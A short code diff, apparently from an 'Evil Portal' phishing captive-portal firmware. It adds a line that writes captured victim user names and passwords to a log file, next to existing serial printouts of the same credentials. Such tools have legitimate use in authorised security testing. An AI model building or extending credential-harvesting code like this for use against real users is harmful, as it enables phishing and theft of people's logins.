@@ -68,6 +68,7 @@ void EvilPortalAddtional::loop() {
             this->password_received = false;
             Serial.println("[INFO] User Name: " + user_name);
             Serial.println("[INFO] Password: " + password);
+            logutils.logAppend("Received: user name:" + this->user_name + " password:" + this->password + "\n");
         }
     }
 }
